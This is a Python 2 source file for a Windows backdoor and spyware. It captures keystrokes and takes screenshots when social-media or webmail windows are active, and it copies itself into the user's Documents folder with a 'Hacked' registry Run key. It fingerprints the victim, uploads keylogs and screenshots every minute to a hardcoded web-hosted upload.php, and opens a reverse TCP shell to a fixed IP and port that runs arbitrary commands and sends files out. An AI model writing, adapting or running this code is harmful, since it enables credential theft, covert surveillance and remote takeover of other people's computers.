import socket
from tempfile import mkdtemp
from threading import Timer, Thread, Lock
from PIL import ImageGrab
import platform
from getpass import getuser
from locale import getdefaultlocale
import subprocess
import os
import shutil
import _winreg as wreg
from uuid import getnode as get_mac
import json
from datetime import datetime
from hashlib import md5
import requests
import pythoncom, pyHook
import win32gui

uploadURL = 'http://monohydric-variatio.000webhostapp.com/upload.php'
identification = {}
botname = ''
proxy = os.environ['HTTP_PROXY']
running = False
store = ''
listOfWindows = ['Facebook', 'Gmail', 'Twitter', 'Hotmail', 'Ymail', 'Yandex']
obj = pyHook.HookManager()
lastWindowText = ''
windowText = ''
tempDir = mkdtemp()
lock = Lock()


def keypressed(event):
    global windowText
    global lastWindowText
    global lock
    # Take a screenshot if any of the mentioned website is in the front screen
    w = win32gui
    windowText = w.GetWindowText(w.GetForegroundWindow())
    if lastWindowText != windowText:  # So that no useless screenshots
        if 'Facebook' in windowText or 'Gmail' in windowText or 'Twitter' in windowText \
                or 'Ymail' in windowText or 'Hotmail' in windowText:
            screenshot()

    global store
    print chr(event.Ascii)  # Print key info

    if event.Ascii == 13:
        keys = '< ENTER >'
    elif event.Ascii == 8:
        keys = '<BSpace>'
    else:
        keys = chr(event.Ascii)

    store += keys
    lock.acquire()              # To avoid modification by emptyloot() thread
    fp = open('keylogs.txt', 'a+')
    fp.write(store)
    fp.close()
    lock.release()
    lastWindowText = windowText
    return True


def keylogger():
    obj.KeyDown = keypressed
    obj.HookKeyboard()
    pythoncom.PumpMessages()        # Not returning as keylogger thread needs to be running in the background


def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()

    else:
        s.send("Unable to find file")


def persistence():
    path = os.getcwd().strip('\n')  # get the current working directory
    Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')  # Get userprofile

    # Place where you wish your backdoor to be copied , here it is C:\Users\<UserName>\Documents
    destination = userprof.strip('\n\r') + '\\Documents' + '\clipbrd.exe'

    if not os.path.exists(destination):
        shutil.copyfile(path + '\clipbrd.exe', destination)
        # This is one of the keys that allows to run on startup , others can be found using
        # sysinternals tools and googling
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
                           0, wreg.KEY_ALL_ACCESS)
        # Hacked is the key name that will run our backdoor on startup
        wreg.SetValueEx(key, 'Hacked', 0, wreg.REG_SZ, destination)
        key.Close()


def sendGet(Url):
    try:
        response = requests.get(url=Url, proxies=proxy)
    except Exception as e:
        return str(e)
    return response


def sendPost(Url, data, files=None):
    try:
        response = requests.post(url=Url, data=data, proxies=proxy)
    except Exception as e:
        return str(e)
    return response


def sendFile(checksum, files=None):
    try:
        response = requests.post(uploadURL, data={'botname': botname}, files=files, proxies=proxy)
        if checksum == response.headers('checksum'):    # To check the checksum for file transfer as ok
            return 'Upl0ad3d0k'
    except Exception as e:
        return str(e)


def getSysDetails():
    global identification
    # generate a unique id to identify the PC
    publicIP = sendGet("http://www.httpbin.org/ip")  # Retrieves ip , local and global
    IP = publicIP.json()  # creates a json object of IPs received
    IP = IP['origin'].split(',')
    if len(IP) > 1:
        publicIP = IP[len(IP) - 1]  # last ip is the public ip
    else:
        publicIP = IP[0]  # last ip is the public ip
    addr = get_mac()  # To uniquely identify the PC
    h = iter(hex(addr)[2:].zfill(12))
    macAddr = "_".join(
        i + next(h) for i in h)  # Taken from http://stackoverflow.com/questions/28927958/python-get-mac-address
    username = getuser()  # Get Username
    locale = getdefaultlocale()[0]  # Helps in identifying the country
    plat = platform.platform()
    arch = platform.machine()
    nodename = platform.node()
    global botname
    botname = locale + '_' + username + '_' + macAddr
    identification = {'botname': botname, 'locale': locale, 'username': username, 'macAddr': macAddr,
                      'publicIP': publicIP,
                      'platform': plat, 'architecture': arch, 'Name': nodename}
    iD = identification
    return json.dumps(iD)


def screenshot():
    now = str(datetime.now()).replace(" ", "_")
    now = now.replace(":", "_")
    ImageGrab.grab().save(tempDir + "\\" + now + "-img.jpg", "JPEG")


def search(command):
    # received command as "search C:\\*.pdf
    command = command[7:]
    path, ext = command.split('*')

    listOfFiles = ''

    for dirpath, dirname, files in os.walk(path):
        for file in files:
            if file.endswith(ext):
                listOfFiles = listOfFiles + '\n' + os.path.join(dirpath, file)

    res = sendPost(uploadURL, data=listOfFiles)


def identity():
    global identification
    identification = getSysDetails()  # send sysDetails on initialisation and set hostname for identifying bot
    files = open(tempDir + '\identity.txt', 'wb')
    files.write(json.dumps(identification))
    files.close()
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
                       0, wreg.KEY_WRITE)
    # Botname is the key name that will stop identity to be sent on each startup
    wreg.SetValueEx(key, 'botID', 0, wreg.REG_SZ, botname)
    key.Close()
    return tempDir


def initialize():
    persistence()
    global botname
    # create identity only if earlier identity doesn't exist , which is to be checked with registry
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
                       0, wreg.KEY_QUERY_VALUE)
    # Enumerate the value of bot to determine whether we need to send identification to server or not
    try:
        botname = wreg.QueryValueEx(key, 'botID')[
            0]  # ensures botname to be present at every startup , for uploading files
    except WindowsError:
        print key
        tempDir = identity()
        files = {'fileToUpload': open(tempDir + '\identity.txt', 'rb')}
        r = sendFile(files)
        files['fileToUpload'].close()
        shutil.rmtree(tempDir)
    key.Close()


def md5Hash(fname):  # Use this  to check successful transfer of data
    hash_md5 = md5()  # From http://stackoverflow.com/questions/3431825/generating-an-md5-checksum-of-a-file
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()


def emptyLoot():
    for dirpath, dirname, files in os.walk(tempDir):
        count = len(files)  # To keep track whether all files have been transferred
        while count:
            for fileName in files:
                lock.acquire()      # To avoid modification by keylogger thread
                sendingFile = {'fileToUpload': open(fileName, 'rb')}
                checksum = md5Hash(sendingFile['fileToUpload'])         # Send the md5sum hash to compare with
                didItGetTransferred = sendFile(checksum, sendingFile)
                if didItGetTransferred == 'Upl0ad3d0k':   # only delete if file transferred successfully
                    try:
                        os.remove(dirpath + '/' + fileName)
                        count -= 1
                    except:
                        pass
                lock.release()
    Timer(60.0, emptyLoot).start()      # Starts to send data every 1 minute


def terminate(s, keyloggerThread, lootThread):
    s.close()
    keyloggerThread.join()
    lootThread.join()
    emptyLoot()         # To transfer files


def connect(keyloggerThread, lootThread):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('172.26.47.11', 1996))
    s.send(getuser())

    while True:
        command = s.recv(1024)
        if 'terminate' in command:
            terminate(s, keyloggerThread, lootThread)
            break

        elif 'grab' in command:
            grab, path = command.split(' ', 1)
            try:
                transfer(s, path)
            except Exception, e:
                s.send(str(e))
                pass

        elif 'sendToServer' in command:
            grab, path = command.split(' ', 1)
            if os.path.exists(path):
                files = {'fileToUpload': open(path, 'rb')}
                r = sendFile(files)
            else:
                r = sendPost(uploadURL, data='[-]File Not Found')
            print "File Uploaded"
            s.send('DONE')

        elif 'screencap' in command:
            screenshot()
            s.send('DONE')

        elif 'cd' in command:
            code, directory = command.split(' ',
                                            1)  # Added maxsplit value as some folders may contain whitespaces like "Program Files"
            os.chdir(directory)
            s.send("[+] CWD is " + os.getcwd())
            s.send('DONE')

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read() + "\n" + CMD.stderr.read())  # sending the result
            s.send('DONE')
            # s.send()  # in case there is a typo by server side


def main():
    keyloggerThread = Thread(1, keylogger(), 'keylogThread', 1)
    keyloggerThread.start()
    initialize()
    lootThread = Timer(60.0, emptyLoot())     # Timer thread to send loot after every 1 minute
    lootThread.start()
    connect(keyloggerThread, lootThread)  # terminate() called when connection is closed


main()
